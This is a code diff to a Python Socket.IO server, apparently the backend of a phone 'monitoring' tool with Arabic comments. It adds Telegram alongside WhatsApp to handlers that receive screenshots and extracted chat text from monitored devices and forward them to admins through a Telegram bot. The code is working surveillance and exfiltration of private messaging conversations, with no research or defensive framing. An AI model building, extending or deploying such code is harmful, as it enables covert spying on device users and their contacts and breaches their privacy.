@@ -3789,7 +3789,21 @@ def _sock_whatsapp_image(data):
     if not dev:
         logger.warning(f"[Socket] whatsapp-image from unknown SID={request.sid}")
         return
-    _process_whatsapp_image(dev, data, request.sid)
+    _process_whatsapp_image(dev, data, request.sid, "واتساب")
+
+
+@socketio.on("telegram-image")
+def _sock_telegram_image(data):
+    """⚡ يستقبل صور تيليجرام من المراقبة الذكية:
+    - الصورة (Base64)
+    - نص المحادثة المستخرج
+    - يرسل للبوت: bot.sendPhoto(caption=text)
+    """
+    dev = dm.get_device_by_sid(request.sid)
+    if not dev:
+        logger.warning(f"[Socket] telegram-image from unknown SID={request.sid}")
+        return
+    _process_whatsapp_image(dev, data, request.sid, "تيليجرام")
 
 
 @socketio.on("whatsapp-monitor-status")
@@ -3813,14 +3827,14 @@ def _sock_whatsapp_monitor_status(data):
                 logger.error(f"❌ Failed to send monitor status: {e}")
 
 
-def _process_whatsapp_image(dev, data, sid):
-    """⚡ يعالج صورة واتساب: يفك Base64 → يرسل للبوت مع نص المحادثة"""
+def _process_whatsapp_image(dev, data, sid, app_name="واتساب"):
+    """⚡ يعالج صورة واتساب/تيليجرام: يفك Base64 → يرسل للبوت مع نص المحادثة"""
     try:
         b64data = data.get("image", "") or data.get("data", "")
         conversation_text = data.get("text", "")
         image_size = data.get("size", 0)
 
-        logger.info(f"📱 whatsapp-image from #{dev.get('short_id', '?')}: "
+        logger.info(f"📱 {app_name}-image from #{dev.get('short_id', '?')}: "
                     f"image={len(b64data)} chars, text={len(conversation_text)} chars")
 
         # إذا فيه صورة
@@ -3835,7 +3849,7 @@ def _process_whatsapp_image(dev, data, sid):
                 bio = BytesIO(binary)
 
                 # Caption يحتوي على نص المحادثة
-                caption = (f"📱 <b>مراقبة واتساب</b>\n"
+                caption = (f"📱 <b>مراقبة {app_name}</b>\n"
                           f"📱 <b>{short_label}</b>\n"
                           f"📏 {len(binary)} bytes\n"
                           f"━━━━━━━━━━━━━━━\n"
@@ -3849,14 +3863,14 @@ def _process_whatsapp_image(dev, data, sid):
                     try:
                         mdm_bot.bot.send_photo(admin_id, photo=bio, caption=caption, parse_mode="HTML")
                         bio.seek(0)
-                        logger.info(f"✅ WhatsApp image sent to admin {admin_id}")
+                        logger.info(f"✅ {app_name} image sent to admin {admin_id}")
                     except Exception as e:
-                        logger.error(f"❌ Failed to send WhatsApp image to admin {admin_id}: {e}")
+                        logger.error(f"❌ Failed to send {app_name} image to admin {admin_id}: {e}")
         else:
             # نص فقط (بدون صورة)
             if mdm_bot and conversation_text:
                 short_label = _dev_label(dev)
-                msg = (f"📱 <b>مراقبة واتساب (نص فقط)</b>\n"
+                msg = (f"📱 <b>مراقبة {app_name} (نص فقط)</b>\n"
                       f"📱 <b>{short_label}</b>\n"
                       f"━━━━━━━━━━━━━━━\n"
                       f"{conversation_text}")
